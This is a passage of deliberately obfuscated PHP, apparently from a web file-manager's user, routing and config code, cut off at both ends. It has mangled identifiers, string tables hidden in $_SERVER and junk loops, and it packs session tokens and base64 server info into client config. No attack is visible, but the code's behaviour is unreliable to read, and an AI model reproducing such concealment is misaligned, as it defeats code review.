array_merge($¬•ÂÖÑ[$—·ëñƒÏ[447]], $÷ˆë¹öÏ[$—·ëñƒÏ[447]]); } $¬•ÂÖÑ[$—·ëñƒÏ[447]] = array_unique_by_key($¬•ÂÖÑ[$—·ëñƒÏ[447]], $—·ëñƒÏ[1817]); $¬•ÂÖÑ[$—·ëñƒÏ[444]] = array($—·ëñƒÏ[445] => count($¬•ÂÖÑ[$—·ëñƒÏ[447]]), $—·ëñƒÏ[441] => 20, $—·ëñƒÏ[430] => 1, $—·ëñƒÏ[446] => 1); return $¬•ÂÖÑ; } public function listSearchNow($ğ¸½á‹”) { $¸øåçå† =& $_SERVER[åÄ¼Ùßš]; $’§Ò¯Ÿ² = trim($ğ¸½á‹”[$¸øåçå†[2115]]); $È–®“ = isset($ğ¸½á‹”[$¸øåçå†[2116]]) ? $ğ¸½á‹”[$¸øåçå†[2116]] : !1; $’§Ò¯Ÿ² = str_replace($¸øåçå†[2117], $¸øåçå†[2118], trim($’§Ò¯Ÿ²)); $Ø¦à·şÌ = array($¸øåçå†[32] => array($¸øåçå†[471], "\x25{$’§Ò¯Ÿ²}\45"), $¸øåçå†[382] => array($¸øåçå†[471], "{$’§Ò¯Ÿ²}\x25"), $¸øåçå†[2323] => array($¸øåçå†[471], "\45{$’§Ò¯Ÿ²}\45"), $¸øåçå†[1108] => $¸øåçå†[2119]); if (Input::check($’§Ò¯Ÿ², $¸øåçå†[388])) { $Ø¦à·şÌ[$¸øåçå†[1817]] = array($¸øåçå†[471], "{$’§Ò¯Ÿ²}\x25"); $Ø¦à·şÌ[$¸øåçå†[2544]] = array($¸øåçå†[471], "{$’§Ò¯Ÿ²}\45"); } if (!$’§Ò¯Ÿ²) { $Ø¦à·şÌ = array(); } if (isset($ğ¸½á‹”[$¸øåçå†[843]])) { $Ø¦à·şÌ[$¸øåçå†[843]] = $ğ¸½á‹”[$¸øåçå†[843]]; } $Ø¦à·şÌ = $this->parseWhereLike($Ø¦à·şÌ); $ñå„À = $this->_makeOrder()->where($Ø¦à·şÌ)->selectPage(20); if (!$ñå„À || count($ñå„À[$¸øåçå†[447]]) < 5 && Input::check($’§Ò¯Ÿ², $¸øåçå†[395])) { $´©¿’Ôğ = $this->_searchFromMeta($¸øåçå†[548], $’§Ò¯Ÿ², 10); $Ï€íŒÅ = $this->_searchFromMeta($¸øåçå†[549], $’§Ò¯Ÿ², 10); $ë‹ß—¯Ï = array_merge($´©¿’Ôğ, $Ï€íŒÅ, $ñå„À[$¸øåçå†[447]]); $ñå„À[$¸øåçå†[447]] = array_unique_by_key($ë‹ß—¯Ï, $¸øåçå†[1817]); $ñå„À[$¸øåçå†[444]][$¸øåçå†[445]] = count($ñå„À[$¸øåçå†[447]]); $ñå„À[$¸øåçå†[444]][$¸øåçå†[446]] = ceil($ñå„À[$¸øåçå†[444]][$¸øåçå†[445]] / $ñå„À[$¸øåçå†[444]][$¸øåçå†[441]]); } $this->_listDataApply($ñå„À[$¸øåçå†[447]]); $this->_filterByGroup($ñå„À, $È–®“); return $ñå„À; } private function _filterByGroup(&$Ü„Ï­¨, $î›­Èµ) { $¼ÕºÆ…€ =& $_SERVER[åÄ¼Ùßš]; if (!$î›­Èµ) { return $Ü„Ï­¨; } foreach ($Ü„Ï­¨[$¼ÕºÆ…€[447]] as $¨‡„‰ Ñ => &$§ŸºêéŒ) { $Åª¥ğƒä = array_to_keyvalue($§ŸºêéŒ[$¼ÕºÆ…€[1427]], $¼ÕºÆ…€[12], $¼ÕºÆ…€[1428]); if (!in_array($î›­Èµ, $Åª¥ğƒä)) { unset($Ü„Ï­¨[$¼ÕºÆ…€[447]][$¨‡„‰ Ñ]); } } unset($§ŸºêéŒ); $Ü„Ï­¨[$¼ÕºÆ…€[447]] = array_values($Ü„Ï­¨[$¼ÕºÆ…€[447]]); $Ü„Ï­¨[$¼ÕºÆ…€[444]] = array($¼ÕºÆ…€[2287] => count($Ü„Ï­¨[$¼ÕºÆ…€[447]]), $¼ÕºÆ…€[2285] => $Ü„Ï­¨[$¼ÕºÆ…€[444]][$¼ÕºÆ…€[441]], $¼ÕºÆ…€[2284] => 1, $¼ÕºÆ…€[2286] => 1); } private function _searchFromMeta($±¬´¶ò«, $ô®ÅÍß, $é”Ã™º…) { $ú–ÜŒ¦ =& $_SERVER[åÄ¼Ùßš]; $ô®ÅÍß = strtolower($ô®ÅÍß); $û£Œ–å¤ = array($ú–ÜŒ¦[97] => $±¬´¶ò«, $ú–ÜŒ¦[452] => array($ú–ÜŒ¦[471], "\x25{$ô®ÅÍß}\45")); $û£Œ–å¤ = $this->parseWhereLike($û£Œ–å¤); $ÎÖ£îá² = Model($ú–ÜŒ¦[2565])->where($û£Œ–å¤)->limit($é”Ã™º…)->select(); if (!$ÎÖ£îá²) { return array(); } $ÎÖ£îá² = array_to_keyvalue($ÎÖ£îá², $ú–ÜŒ¦[12], $ú–ÜŒ¦[1817]); $¹ºìö’  = $this->where(array($ú–ÜŒ¦[1808] => array($ú–ÜŒ¦[7], $ÎÖ£îá²)))->select(); if (!$¹ºìö’ ) { return array(); } return $¹ºìö’ ; } private function _listDataApplyItem($­ÑÕ…ñ) { $¾«Õ™ºû = array($­ÑÕ…ñ); $this->_listDataApply($¾«Õ™ºû); return $¾«Õ™ºû[0]; } private function _listDataApply(&$Çş½«¿ä) { $ßûäµ£ş =& $_SERVER[åÄ¼Ùßš]; if (!$Çş½«¿ä) { return; } array_remove_key($Çş½«¿ä, $ßûäµ£ş[994]); $™ÒĞÈ†Å = array_to_keyvalue($Çş½«¿ä, $ßûäµ£ş[12], $ßûäµ£ş[1817]); $this->_listAppendGroup($Çş½«¿ä, $™ÒĞÈ†Å); $this->_listAppendMeta($Çş½«¿ä, $™ÒĞÈ†Å); $this->_listAppendSourceRoot($Çş½«¿ä, $™ÒĞÈ†Å); } private function _listAppendSourceRoot(&$“éó„û˜, $Áú¢ï±¥) { $“¡Õ„˜È =& $_SERVER[åÄ¼Ùßš]; $îÌ¢ó™• = Model($“¡Õ„˜È[926])->listSourceRoot(SourceModel::TYPE_USER, $Áú¢ï±¥); $îÌ¢ó™• = array_to_keyvalue($îÌ¢ó™•, $“¡Õ„˜È[582]); $îÌ¢ó™• = array_remove_key($îÌ¢ó™•, $“¡Õ„˜È[582]); foreach ($“éó„û˜ as &$¸È®¹£€) { $¸È®¹£€[$“¡Õ„˜È[90]] = $îÌ¢ó™•[$¸È®¹£€[$“¡Õ„˜È[1817]]] ? $îÌ¢ó™•[$¸È®¹£€[$“¡Õ„˜È[1817]]] : array(); } unset($¸È®¹£€); } private function _listAppendGroup(&$á™‘äÄ³, $ƒßŒ¬—) { $Æ‘¹ áæ =& $_SERVER[åÄ¼Ùßš]; $š§«ä = array($Æ‘¹ áæ[1817] => array($Æ‘¹ áæ[7], $ƒßŒ¬—)); $·”•›¸— = Model($Æ‘¹ áæ[2111])->where($š§«ä)->select(); $¸¿ôŒòû = array_to_keyvalue($·”•›¸—, $Æ‘¹ áæ[12], $Æ‘¹ áæ[1428]); $¸¿ôŒòû = array_remove_value(array_unique($¸¿ôŒòû), $Æ‘¹ áæ[231]); if (!$¸¿ôŒòû || !$·”•›¸—) { return; } $š§«ä = array($Æ‘¹ áæ[1428] => array($Æ‘¹ áæ[7], $¸¿ôŒòû)); $Üã‰½ï = Model($Æ‘¹ áæ[1426])->field($Æ‘¹ áæ[2566])->where($š§«ä)->select(); $Üã‰½ï = array_to_keyvalue($Üã‰½ï, $Æ‘¹ áæ[1428]); $·”•›¸— = array_to_keyvalue_group($·”•›¸—, $Æ‘¹ áæ[1817]); foreach ($·”•›¸— as &$öÍŒ·‚¥) { $Ú±–ı = array(); foreach ($öÍŒ·‚¥ as $üÄª›Ó×) { if (!$üÄª›Ó×[$Æ‘¹ áæ[2125]]) { continue; } $‡”Ã÷¾ = Model($Æ‘¹ áæ[584])->listData($üÄª›Ó×[$Æ‘¹ áæ[2125]]); $Ú±–ı[] = array($Æ‘¹ áæ[1428] => $üÄª›Ó×[$Æ‘¹ áæ[1428]], $Æ‘¹ áæ[2567] => $Üã‰½ï[$üÄª›Ó×[$Æ‘¹ áæ[1428]]][$Æ‘¹ áæ[32]], $Æ‘¹ áæ[597] => $Üã‰½ï[$üÄª›Ó×[$Æ‘¹ áæ[1428]]][$Æ‘¹ áæ[597]], $Æ‘¹ áæ[499] => $‡”Ã÷¾); } $öÍŒ·‚¥ = $Ú±–ı; } unset($öÍŒ·‚¥); foreach ($á™‘äÄ³ as &$‰ÑÉ‘Ê) { $‰ÑÉ‘Ê[$Æ‘¹ áæ[1427]] = array(); if (isset($·”•›¸—[$‰ÑÉ‘Ê[$Æ‘¹ áæ[1817]]])) { $‰ÑÉ‘Ê[$Æ‘¹ áæ[1427]] = $·”•›¸—[$‰ÑÉ‘Ê[$Æ‘¹ áæ[1817]]]; } } unset($‰ÑÉ‘Ê); } public function userAppendGroup($Îëıˆ¿) { $ÄİŠ††ï =& $_SERVER[åÄ¼Ùßš]; if (!$Îëıˆ¿) { return array(); } $this->_listAppendGroup($Îëıˆ¿, array_to_keyvalue($Îëıˆ¿, $ÄİŠ††ï[12], $ÄİŠ††ï[1817])); return $Îëıˆ¿; } private function _listAppendMeta(&$—†Ä•üÚ, $ğÂ¨¢àô) { $Š–ğµÁ¿ =& $_SERVER[åÄ¼Ùßš]; $Ìå“¾« = UserJobModel::JOB_KEY; $½´İÚ­Ÿ = array($Š–ğµÁ¿[2109]); $å¿¥İ¦“ = array($Š–ğµÁ¿[1817] => array($Š–ğµÁ¿[7], $ğÂ¨¢àô)); $¯ÛºŠäŸ = Model($Š–ğµÁ¿[2543])->where($å¿¥İ¦“)->select(); $·–å…Àî = array(); foreach ($¯ÛºŠäŸ as $äÆ³á¸£) { $¼„ÒËè· = $äÆ³á¸£[$Š–ğµÁ¿[1817]]; if (!isset($·–å…Àî[$¼„ÒËè·])) { $·–å…Àî[$¼„ÒËè·] = array(); } $·–å…Àî[$¼„ÒËè·][$äÆ³á¸£[$Š–ğµÁ¿[97]]] = $äÆ³á¸£[$Š–ğµÁ¿[452]]; } $ŞıÒÛˆØ = Model($Š–ğµÁ¿[2568]); foreach ($—†Ä•üÚ as &$âÏø§—š) { $¼„ÒËè· = $âÏø§—š[$Š–ğµÁ¿[1817]]; $¦©úã¯ş = isset($·–å…Àî[$¼„ÒËè·]) ? $·–å…Àî[$¼„ÒËè·] : array(); $âÏø§—š[$Š–ğµÁ¿[552]] = array_field_key($¦©úã¯ş, $½´İÚ­Ÿ); $âÏø§—š[$Š–ğµÁ¿[2569]] = array(); if (isset($¦©úã¯ş[$Ìå“¾«])) { $âÏø§—š[$Š–ğµÁ¿[2569]] = $ŞıÒÛˆØ->getUserJobInfo($¦©úã¯ş[$Ìå“¾«]); } } unset($âÏø§—š); } protected function groupUserAll($«†‡ï¶›) { $‡ŠŞ‘Äœ =& $_SERVER[åÄ¼Ùßš]; if (!$«†‡ï¶›) { return !1; } $¿·ñşë™ = Model($‡ŠŞ‘Äœ[2111])->field($‡ŠŞ‘Äœ[1817])->where(array($‡ŠŞ‘Äœ[1428] => array($‡ŠŞ‘Äœ[7], $«†‡ï¶›)))->select(); $¿·ñşë™ = array_to_keyvalue($¿·ñşë™, $‡ŠŞ‘Äœ[12], $‡ŠŞ‘Äœ[1817]); return array_unique($¿·ñşë™); } public function userSearch($„Ä˜„ÄØ, $–ñÄ±ô’ = "\x2a") { return Model($_SERVER[åÄ¼Ùßš][610])->where($„Ä˜„ÄØ)->field($–ñÄ±ô’)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\x6f\x70\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¦ÖÙá±À) { return "\x55\x73\145\x72\x4f\160\x74\x69\x6f\x6e\137{$¦ÖÙá±À}\x5f" . KodUser::id(); } protected function filterWhere($äõ½ÀâÀ) { $äõ½ÀâÀ[$_SERVER[åÄ¼Ùßš][1817]] = KodUser::id(); return $äõ½ÀâÀ; } public function cacheRemoveUser($›ùäìòé, $®¥”µõÎ) { return Cache::remove("\x55\x73\145\162\117\160\x74\151\x6f\156\x5f{$›ùäìòé}\137" . $®¥”µõÎ); } protected function optionDefault($ÕÕÑÛİ = '') { $Â·¸ù™Ã =& $_SERVER[åÄ¼Ùßš]; if ($ÕÕÑÛİ == $Â·¸ù™Ã[12]) { return $GLOBALS[$Â·¸ù™Ã[6]][$Â·¸ù™Ã[2570]]; } if ($ÕÕÑÛİ == $Â·¸ù™Ã[2571]) { return $GLOBALS[$Â·¸ù™Ã[6]][$Â·¸ù™Ã[2572]]; } } } goto Eù¹Ê¥åî; C¨àĞáğËƒ: class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\156\x64\145\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($ğ÷Å¶¥¯) { $‘Ğ¨îàÒ =& $_SERVER[åÄ¼Ùßš]; $ßµ®˜£á =& $_SERVER[ˆÆ²õğ®]; $€šÌ†Î® = explode($ßµ®˜£á[0], trim($ğ÷Å¶¥¯, $ßµ®˜£á[0])); $ÑŒÍ’Óœ = $‘Ğ¨îàÒ[699]; while (strlen($ÑŒÍ’Óœ) < $‘Ğ¨îàÒ[700]) { if (!$ÑŒÍ’Óœ) { break; } $ÑŒÍ’Óœ++; } $this->defaultModule = $€šÌ†Î®[0] ? $€šÌ†Î®[0] : $this->defaultModule; $this->defaultController = $€šÌ†Î®[1] ? $€šÌ†Î®[1] : $this->defaultController; $†ÀûÕÕ = $‘Ğ¨îàÒ[701]; $this->defaultAction = $€šÌ†Î®[2] ? $€šÌ†Î®[2] : $this->defaultAction; $this->lvzhed822181($ßµ®˜£á[1], array($this, $ßµ®˜£á[2])); $Ğá“Ì¡˜ = $‘Ğ¨îàÒ[702]; while (strlen($Ğá“Ì¡˜) < $‘Ğ¨îàÒ[703]) { if (!$Ğá“Ì¡˜) { break; } $Ğá“Ì¡˜++; } } public function appRun($¤óŠÙ) { $’ÛÑí¤ =& $_SERVER[åÄ¼Ùßš]; $Ô€³´ =& $_SERVER[ˆÆ²õğ®]; $°·•î‡Æ = explode($Ô€³´[0], $¤óŠÙ); $È•áá‚æ = $’ÛÑí¤[704]; $ò¹úÌ’ = strtolower($°·•î‡Æ[0]); $ÙƒªŞé = $’ÛÑí¤[705]; if (!$ÙƒªŞé) { return; } $†£‡ÌØ‡ = $Ô€³´[3]; $ıå‰şÍÑ = $’ÛÑí¤[706]; if (strlen($ıå‰şÍÑ) < $’ÛÑí¤[700]) { die; } if ($ò¹úÌ’ == $Ô€³´[4]) { $†£‡ÌØ‡ = $Ô€³´[5]; $°·•î‡Æ[0] = $Ô€³´[6]; $°·•î‡Æ[1] = $°·•î‡Æ[1] . $Ô€³´[7]; $¤óŠÙ = join($Ô€³´[0], $°·•î‡Æ); $¤óŠÙ = trim($¤óŠÙ, $Ô€³´[0]); } call_user_func(array($Ô€³´[8], $Ô€³´[9]), $†£‡ÌØ‡ . $Ô€³´[10], $¤óŠÙ); ActionCall($¤óŠÙ); $£½ªö× = $’ÛÑí¤[707]; while (strlen($£½ªö×) < $’ÛÑí¤[708]) { if (!$£½ªö×) { break; } $£½ªö×++; } call_user_func(array($Ô€³´[8], $Ô€³´[9]), $†£‡ÌØ‡ . $Ô€³´[11], $¤óŠÙ); } private function autorun() { $ƒÀ‹É =& $_SERVER[ˆÆ²õğ®]; global $config; $Ê˜´† = $_SERVER[åÄ¼Ùßš][709]; if (count($config[$ƒÀ‹É[12]]) == 0) { return; } foreach ($config[$ƒÀ‹É[12]] as $øÆ›õ‘¶ => $•ç´õ´Š) { $this->appRun($•ç´õ´Š); } } private function sauh98de4873() { $­ÙÉ¶­ì =& $_SERVER[åÄ¼Ùßš]; $ŸğÑ®Ë¡ =& $_SERVER[ˆÆ²õğ®]; $ßıöŠ¶ = $ŸğÑ®Ë¡[4]; $Ë¼¹°«œ = $GLOBALS[$ŸğÑ®Ë¡[13]][$ŸğÑ®Ë¡[14]][0]; if (!$Ë¼¹°«œ || strlen($Ë¼¹°«œ) <= strlen($ßıöŠ¶)) { return; } if (strtolower(substr($Ë¼¹°«œ, -strlen($ßıöŠ¶))) != $ßıöŠ¶) { return; } $×í“–õ¢ = substr($Ë¼¹°«œ, 0, -strlen($ßıöŠ¶)); $´—Ú¸±î = array($ŸğÑ®Ë¡[4], $×í“–õ¢); $ÈäŠèÍ‰ = array_slice($GLOBALS[$ŸğÑ®Ë¡[13]][$ŸğÑ®Ë¡[14]], 1); $áÛ’‚€’ = $­ÙÉ¶­ì[710]; $GLOBALS[$ŸğÑ®Ë¡[13]][$ŸğÑ®Ë¡[14]] = array_merge($´—Ú¸±î, $ÈäŠèÍ‰); $ô¹ú€ = $­ÙÉ¶­ì[711]; if (!$ô¹ú€) { die; } $GLOBALS[$ŸğÑ®Ë¡[13]][$ŸğÑ®Ë¡[15]] = implode($ŸğÑ®Ë¡[0], $GLOBALS[$ŸğÑ®Ë¡[13]][$ŸğÑ®Ë¡[14]]); $Î½……­ = $­ÙÉ¶­ì[712]; if (strlen($Î½……­) < $­ÙÉ¶­ì[713]) { die; } } private function jdfy59ae1b6a() { $€ôåå°À =& $_SERVER[åÄ¼Ùßš]; $†ˆ¿’¡ =& $_SERVER[ˆÆ²õğ®]; if ($GLOBALS[$†ˆ¿’¡[13]][$†ˆ¿’¡[15]] != $†ˆ¿’¡[6]) { return; } $Ôè™Ãàü = $_SERVER[$†ˆ¿’¡[16]]; $ó¡±ºÑç = $†ˆ¿’¡[17]; $Î¾©³È = $€ôåå°À[714]; if (!strstr($Ôè™Ãàü, $ó¡±ºÑç)) { return; } $µ–šş´‰ = strrpos($Ôè™Ãàü, $ó¡±ºÑç); $‹™úÙÊñ = $€ôåå°À[715]; while (strlen($‹™úÙÊñ) < $€ôåå°À[708]) { if (!$‹™úÙÊñ) { break; } $‹™úÙÊñ++; } $Œ‚’ùŒğ = substr($Ôè™Ãàü, $µ–šş´‰ + strlen($ó¡±ºÑç)); $ß—¶¯àÓ = $€ôåå°À[716]; preg_match_all($†ˆ¿’¡[18], $Œ‚’ùŒğ, $º§µâ¿); $‚Í€¾ç¼ = $€ôåå°À[717]; if (!$‚Í€¾ç¼) { return; } $Œ‚’ùŒğ = trim($º§µâ¿[0][0], $†ˆ¿’¡[19]); $GLOBALS[$†ˆ¿’¡[13]][$†ˆ¿’¡[14]] = explode($†ˆ¿’¡[19], $Œ‚’ùŒğ); $†›Áò¤¬ = $€ôåå°À[718]; $GLOBALS[$†ˆ¿’¡[13]][$†ˆ¿’¡[15]] = implode($†ˆ¿’¡[0], $GLOBALS[$†ˆ¿’¡[13]][$†ˆ¿’¡[14]]); $¾¤†¥¤« = $€ôåå°À[719]; if (strlen($¾¤†¥¤«) < $€ôåå°À[703]) { die; } } public function run() { $øäïàÓ­ =& $_SERVER[åÄ¼Ùßš]; $ñ÷¯ô‡ =& $_SERVER[ˆÆ²õğ®]; $this->jdfy59ae1b6a(); $œ¹ëŒœŸ = $øäïàÓ­[720]; while ($œ¹ëŒœŸ < $øäïàÓ­[708]) { if ($œ¹ëŒœŸ >= 0) { break; } $œ¹ëŒœŸ++; } $this->sauh98de4873(); $ïÒµ†×– = $øäïàÓ­[721]; while ($ïÒµ†×– < $øäïàÓ­[700]) { if ($ïÒµ†×– >= 0) { break; } $ïÒµ†×–++; } $üğ×¡ê = $GLOBALS[$ñ÷¯ô‡[13]][$ñ÷¯ô‡[14]]; $‡‘È°“ = $øäïàÓ­[709]; while ($‡‘È°“ < $øäïàÓ­[722]) { if ($‡‘È°“ >= 0) { break; } $‡‘È°“++; } $Ò­£¹Áë = $GLOBALS[$ñ÷¯ô‡[13]][$ñ÷¯ô‡[15]]; $ÅşÔ„Î­ = $øäïàÓ­[723]; if (!$ÅşÔ„Î­) { die; } define($ñ÷¯ô‡[20], isset($üğ×¡ê[0]) && $üğ×¡ê[0] ? $üğ×¡ê[0] : $this->defaultModule); define($ñ÷¯ô‡[21], isset($üğ×¡ê[1]) && $üğ×¡ê[0] ? $üğ×¡ê[1] : $this->defaultController); $òŒ©“»ï = $øäïàÓ­[724]; define($ñ÷¯ô‡[22], isset($üğ×¡ê[2]) && $üğ×¡ê[0] ? $üğ×¡ê[2] : $this->defaultAction); define($ñ÷¯ô‡[23], MOD . $ñ÷¯ô‡[0] . ST . $ñ÷¯ô‡[0] . ACT); $_SERVER[$ñ÷¯ô‡[24]] = strtolower(ACTION); $this->autorun(); $È‘˜ŒõÒ = $øäïàÓ­[704]; if (!$È‘˜ŒõÒ) { die; } if (count($üğ×¡ê) >= 3) { $this->appRun($Ò­£¹Áë); } else { $this->appRun(ACTION); } } private $smxo9beb61f9 = array(); private $wkpq0cfcacf8 = ''; public function qfdza1295973() { $®èÉÖÙË =& $_SERVER[åÄ¼Ùßš]; $õÕÊñ” =& $_SERVER[ˆÆ²õğ®]; $this->yxgs7f6e6a67(); $úàÍä¿û = $®èÉÖÙË[725]; if (!$úàÍä¿û) { die; } $this->mdoy01fdba73(); $this->lxeu0f0d25fd(); $this->yewnca6e4dc4(); $this->awcu6036b16f(); $™Ü³¡è = $®èÉÖÙË[726]; while ($™Ü³¡è < $®èÉÖÙË[713]) { if ($™Ü³¡è >= 0) { break; } $™Ü³¡è++; } $this->sudi6db32810(); $this->fpbeb561d3a5(); $this->lvzhed822181($õÕÊñ”[25], array($this, $õÕÊñ”[26])); $ï‹Ò×â” = $®èÉÖÙË[727]; if (strlen($ï‹Ò×â”) < $®èÉÖÙË[708]) { return; } $this->lvzhed822181($õÕÊñ”[27], array($this, $õÕÊñ”[28])); $this->lvzhed822181($õÕÊñ”[29], array($this, $õÕÊñ”[30])); $this->lvzhed822181($õÕÊñ”[31], array($this, $õÕÊñ”[32])); } public function clin5e8c79b3($‚ÀÌñÙ) { $Çïêäë£ =& $_SERVER[åÄ¼Ùßš]; $Î¢¶ˆ =& $_SERVER[ˆÆ²õğ®]; $»˜ûÃß§ = Model($Î¢¶ˆ[33])->get(); $å©¦æâô = array($Î¢¶ˆ[34], $Î¢¶ˆ[35], $Î¢¶ˆ[36], $Î¢¶ˆ[37], $Î¢¶ˆ[38], $Î¢¶ˆ[39], $Î¢¶ˆ[40], $Î¢¶ˆ[41], $Î¢¶ˆ[42], $Î¢¶ˆ[43], $Î¢¶ˆ[44], $Î¢¶ˆ[45], $Î¢¶ˆ[46], $Î¢¶ˆ[47], $Î¢¶ˆ[48], $Î¢¶ˆ[49], $Î¢¶ˆ[50], $Î¢¶ˆ[51], $Î¢¶ˆ[52], $Î¢¶ˆ[53], $Î¢¶ˆ[54], $Î¢¶ˆ[55], $Î¢¶ˆ[56], $Î¢¶ˆ[57], $Î¢¶ˆ[58], $Î¢¶ˆ[59], $Î¢¶ˆ[60], $Î¢¶ˆ[61], $Î¢¶ˆ[62], $Î¢¶ˆ[63], $Î¢¶ˆ[64], $Î¢¶ˆ[65], $Î¢¶ˆ[66], $Î¢¶ˆ[67], $Î¢¶ˆ[68], $Î¢¶ˆ[69], $Î¢¶ˆ[70], $Î¢¶ˆ[71], $Î¢¶ˆ[72], $Î¢¶ˆ[73], $Î¢¶ˆ[74], $Î¢¶ˆ[75], $Î¢¶ˆ[76], $Î¢¶ˆ[77], $Î¢¶ˆ[78], $Î¢¶ˆ[79], $Î¢¶ˆ[80], $Î¢¶ˆ[81], $Î¢¶ˆ[82], $Î¢¶ˆ[83], $Î¢¶ˆ[84], $Î¢¶ˆ[85]); $Àé‰¯ = $Çïêäë£[728]; if (!$Àé‰¯) { die; } foreach ($å©¦æâô as $ÔÎ­ÑÆğ) { $Ç»ô¾Úä = $GLOBALS[$Î¢¶ˆ[86]][$Î¢¶ˆ[87]][$ÔÎ­ÑÆğ]; $²öÖó›Ä = $Çïêäë£[729]; while (strlen($²öÖó›Ä) < $Çïêäë£[713]) { if (!$²öÖó›Ä) { break; } $²öÖó›Ä++; } if (isset($»˜ûÃß§[$ÔÎ­ÑÆğ])) { $Ç»ô¾Úä = $»˜ûÃß§[$ÔÎ­ÑÆğ]; } $‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$ÔÎ­ÑÆğ] = $Ç»ô¾Úä; } $˜Öğàè = $‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$Î¢¶ˆ[46]]; unset($‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[90]][$Î¢¶ˆ[91]]); $Šô¯ÜÇ = $Çïêäë£[730]; while (strlen($Šô¯ÜÇ) < $Çïêäë£[722]) { if (!$Šô¯ÜÇ) { break; } $Šô¯ÜÇ++; } unset($‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[90]][$Î¢¶ˆ[92]]); unset($‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$Î¢¶ˆ[46]]); $Šªı«÷ˆ = $Çïêäë£[731]; while (strlen($Šªı«÷ˆ) < $Çïêäë£[700]) { if (!$Šªı«÷ˆ) { break; } $Šªı«÷ˆ++; } unset($‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$Î¢¶ˆ[93]]); $Ğ£»À—Ø = $Çïêäë£[732]; $‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$Î¢¶ˆ[94]] = array($Î¢¶ˆ[95] => (int) $˜Öğàè[$Î¢¶ˆ[96]], $Î¢¶ˆ[97] => (int) _get($˜Öğàè, $Î¢¶ˆ[98], 0)); $´•¨¥‡‰ = substr(md5($Î¢¶ˆ[99] . get_client_ip() . $»˜ûÃß§[$Î¢¶ˆ[100]]), 0, 15); $³¤æá¼¢ = $Çïêäë£[733]; if (strlen($³¤æá¼¢) < $Çïêäë£[722]) { return; } $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[102]] = Mcrypt::encode(Session::sign(), $´•¨¥‡‰, 3600 * 24); $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[103]] = Action($Î¢¶ˆ[104])->accessToken(); $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[105]] = md5($_SERVER[$Î¢¶ˆ[106]] . $»˜ûÃß§[$Î¢¶ˆ[100]]); $µšµñšï = $Çïêäë£[734]; if (!$µšµñšï) { return; } $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[107]] = base64_encode(serverInfo()); $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[108]] = $this->wkpq0cfcacf8; $åè¥ëöÛ = $Çïêäë£[735]; if (!$åè¥ëöÛ) { die; } if ($»˜ûÃß§[$Î¢¶ˆ[108]] != $Î¢¶ˆ[109]) { $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[110]] = $»˜ûÃß§[$Î¢¶ˆ[110]]; $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[111]] = $»˜ûÃß§[$Î¢¶ˆ[111]]; $µ‰‚‹˜ = rand_string(10) . $this->wkpq0cfcacf8 . rand_string(5); $‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[112]][$Î¢¶ˆ[113]] = $this->avrmc5b5e7af($µ‰‚‹˜, $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[105]]); } if ($this->wkpq0cfcacf8 == $Î¢¶ˆ[109]) { $‚ÀÌñÙ[$Î¢¶ˆ[88]][$Î¢¶ˆ[89]][$Î¢¶ˆ[94]][$Î¢¶ˆ[98]] = 0; } $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[114]] = $this->versionPluginFilter(); $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[115]] = _get($this->smxo9beb61f9, $Î¢¶ˆ[116], $Î¢¶ˆ[6]); $£•Ğ…ÖÈ = $Çïêäë£[736]; if (!$£•Ğ…ÖÈ) { return; } if (KodUser::isRoot() && $this->config[$Î¢¶ˆ[117]]) { $‚ÀÌñÙ[$Î¢¶ˆ[101]][$Î¢¶ˆ[118]] = WEB_ROOT; } return $‚ÀÌñÙ; } private function sudi6db32810() { $àµğ™”ê =& $_SERVER[åÄ¼Ùßš]; $ÙÖãı¶ =& $_SERVER[ˆÆ²õğ®]; $Ÿ±©Ö¹ä = $_SERVER[$ÙÖãı¶[24]] == $ÙÖãı¶[119]; if ($_SERVER[$ÙÖãı¶[24]] == $ÙÖãı¶[120] && $_GET[$ÙÖãı¶[121]] == $ÙÖãı¶[122]) { $Ÿ±©Ö¹ä = !0; } if ($Ÿ±©Ö¹ä) { $¼ÍÙº•˜ = array($ÙÖãı¶[108] => $this->wkpq0cfcacf8, $ÙÖãı¶[123] => $this->jzbe3298086d(), $ÙÖãı¶[124] => Model($ÙÖãı¶[125])->count()); if ($this->wkpq0cfcacf8 != $ÙÖãı¶[109]) { $Ì±Óğ—Ñ = _get($this->smxo9beb61f9, $ÙÖãı¶[126]); if ($Ì±Óğ—Ñ) { $¼ÍÙº•˜[$ÙÖãı¶[127]] = $Ì±Óğ—Ñ; $¼ÍÙº•˜[$ÙÖãı¶[128]] = strtotime(_get($this->smxo9beb61f9, $ÙÖãı¶[129])); $¼ÍÙº•˜[$ÙÖãı¶[130]] = _get($this->smxo9beb61f9, $ÙÖãı¶[116]); } $â¥İñÎ• = Model($ÙÖãı¶[33])->get($ÙÖãı¶[131], $ÙÖãı¶[6], !0); if (is_string($â¥İñÎ•) && substr($â¥İñÎ•, 0, 1) == $ÙÖãı¶[132]) { $â¥İñÎ• = json_decode_force($â¥İñÎ•); } if 